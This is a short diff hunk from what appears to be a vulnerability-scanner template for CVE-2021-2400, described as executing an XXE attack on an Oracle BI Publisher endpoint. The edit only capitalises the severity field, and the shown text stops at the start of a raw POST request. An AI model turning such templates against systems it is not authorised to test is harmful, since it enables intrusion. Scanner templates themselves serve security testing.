@@ -3,7 +3,7 @@ info:
   author: Excis3
   description: Discover services to Executes an XXE attack
   name: "CVE-2021\u20132400"
-  severity: critical
+  severity: Critical
 requests:
 - raw:
   - 'POST /xmlpserver/ReportTemplateService.xls HTTP/1.1
